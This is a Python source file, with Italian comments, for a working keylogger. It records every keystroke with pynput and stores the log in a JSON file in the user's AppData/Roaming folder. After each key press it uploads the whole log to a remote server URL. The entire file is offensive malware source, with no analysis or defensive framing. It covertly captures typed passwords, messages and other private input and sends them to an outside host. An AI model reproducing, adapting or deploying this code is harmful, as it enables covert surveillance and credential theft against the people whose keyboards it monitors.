import json
import requests
from pynput.keyboard import Key, Listener
import logging
import os

SERVER_URL = 'http://xxx.xxx.xxx.xxx:5000/upload_log'  # Sostituisci con l'URL del tuo server
LOG_FILE_PATH = f'C:/Users/{os.getlogin()}/AppData/Roaming/log.json'

class sendKeys:
    def __init__(self):
        self.log_file_path = LOG_FILE_PATH
        self.special_keys = set()
        self.shift_pressed = False

        # Svuota il file di log all'avvio del programma
        with open(self.log_file_path, 'w', encoding='utf-8') as log_file:
            log_file.write('')

    def send_log_as_json(self, log_content):
        # Invia il file di log al server come file multipart
        files = {'file': ('log.json', '\n'.join(json.dumps(entry, ensure_ascii=False) for entry in log_content))}
        requests.post(SERVER_URL, files=files)

    def sendKey(self, key):
        # Registra la chiave nel file di log
        logging.info(key)

        # Aggiorna la chiave se lo shift è premuto
        if self.shift_pressed and 'value' in key:
            key['value'] = f"Shift + {key['value']}"

        # Aggiorna la chiave se è un tasto speciale
        if key['value'] in self.special_keys:
            key['value'] = f"{key['value']}"

        # Leggi il contenuto attuale del file di log
        try:
            with open(self.log_file_path, 'r', encoding='utf-8') as log_file:
                log_content = json.load(log_file)
        except (FileNotFoundError, json.JSONDecodeError):
            log_content = []

        # Decodifica il valore Base64, se presente
        if 'value' in key and isinstance(key['value'], bytes):
            key['value'] = key['value'].decode('utf-8')

        # Aggiungi la nuova chiave al contenuto del file di log
        log_content.append(key)

        # Scrivi il contenuto aggiornato nel file di log
        with open(self.log_file_path, 'w', encoding='utf-8') as log_file:
            json.dump(log_content, log_file, ensure_ascii=False, indent=2)

        # Invia il file di log al server
        self.send_log_as_json(log_content)

class logKey:
    def __init__(self):
        self.sender = sendKeys()

    def on_input(self, key):
        if hasattr(key, 'char'):  # Se è una tastiera normale
            key_value = key.char
        else:  # Altrimenti, usa la rappresentazione di default
            key_value = str(key)

        # Gestisci lo stato del tasto Shift
        if key == Key.shift:
            self.sender.shift_pressed = True
        elif key == Key.shift_r:
            self.sender.special_keys.add('Shift_R')
        elif key == Key.alt:
            self.sender.special_keys.add('Alt')
        elif key == Key.alt_r:
            self.sender.special_keys.add('Alt_R')
        elif key == Key.ctrl:
            self.sender.special_keys.add('Ctrl')
        elif key == Key.ctrl_r:
            self.sender.special_keys.add('Ctrl_R')
        else:
            self.sender.sendKey({'type': 'key', 'value': key_value.encode('utf-8').decode('utf-8')})

    def on_release(self, key):
        # Resetta lo stato dei tasti speciali
        if key == Key.shift_r:
            self.sender.special_keys.discard('Shift_R')
        elif key == Key.alt:
            self.sender.special_keys.discard('Alt')
        elif key == Key.alt_r:
            self.sender.special_keys.discard('Alt_R')
        elif key == Key.ctrl:
            self.sender.special_keys.discard('Ctrl')
        elif key == Key.ctrl_r:
            self.sender.special_keys.discard('Ctrl_R')

        # Resetta lo stato del tasto Shift
        if key == Key.shift:
            self.sender.shift_pressed = False

# Crea un'istanza della classe logKey
key_logger = logKey()

# Avvia il Listener
with Listener(on_press=key_logger.on_input, on_release=key_logger.on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Errore durante l'esecuzione del listener: {e}")